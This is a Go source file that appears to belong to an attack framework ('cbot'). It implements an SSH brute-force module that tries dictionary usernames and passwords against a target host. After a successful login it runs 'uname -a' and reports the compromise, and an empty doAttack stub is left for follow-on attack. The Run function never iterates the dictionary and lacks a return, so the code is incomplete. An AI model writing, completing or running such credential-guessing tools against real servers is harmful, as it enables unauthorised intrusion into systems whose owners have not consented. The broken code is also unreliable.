package bruteforce

import (
	"fmt"
	"github.com/cbot/attack"
	"github.com/cbot/proto/ssh"
	"github.com/cbot/targets/source"
	"strings"
	"time"
)

var SSHBruteForceAttackType = "SSHBruteForceAttack"
var SSHBruteForceAttackDefaultProto = "ssh"
var SSHBruteForceAttackDefaultPort = 22
var SSHBruteForceAttackName = "ssh_bruteforce_attack"
var Timeout = 5000

type SSHBruteforceAttack struct {
	dictPool    *DictPool
	attackTasks *attack.AttackTasks
}

func (sba *SSHBruteforceAttack) Name() string {

	return SSHBruteForceAttackName
}

func (sba *SSHBruteforceAttack) DefaultPort() int {

	return SSHBruteForceAttackDefaultPort
}

func (sba *SSHBruteforceAttack) DefaultProto() string {

	return SSHBruteForceAttackDefaultProto
}

func (sba *SSHBruteforceAttack) Accept(target source.Target) bool {

	types := target.Source().GetTypes()

	for _, t := range types {

		if strings.EqualFold(t, SSHBruteForceAttackType) {

			return true
		}
	}

	return false
}

func (sba *SSHBruteforceAttack) doAttack(ip string, port int, user string, passwd string) {

}

func (sba *SSHBruteforceAttack) tryBruteforce(ip string, port int, entry *DictEntry) {

	sshClient, err := ssh.LoginWithPasswd(ip, port, entry.user, entry.pass, int64(Timeout))

	if err != nil {

		return
	}
	defer sshClient.Close()

	//bruteforce ok
	result, err := sshClient.RunCmd("uname -a")

	ap := &attack.AttackProcess{
		TengoObj: attack.TengoObj{},
		IP:       ip,
		Host:     ip,
		Port:     port,
		Proto:    "ssh",
		App:      "ssh",
		OS:       "linux",
		Name:     "BruteForce/SSH/OK",
		Type:     "BruteForce/SSH",
		Status:   0,
		Payload:  "uname -a",
		Result:   string(result),
	}

	sba.PubProcess(ap)

	//start to attack
	sba.doAttack(ip, port, entry.user, entry.pass)
}

func (sba *SSHBruteforceAttack) Run(target source.Target) error {

	dictEntries := sba.dictPool.Dicts()

	ip := target.IP()
	port := target.Port()

	if port <= 0 {

		port = sba.DefaultPort()
	}

	if ip == "" || port <= 0 {
		return fmt.Errorf("Invalid ip:%s and port:%d", ip, port)
	}

}

func (sba *SSHBruteforceAttack) PubProcess(process *attack.AttackProcess) {

	sba.attackTasks.PubAttackProcess(process)

}
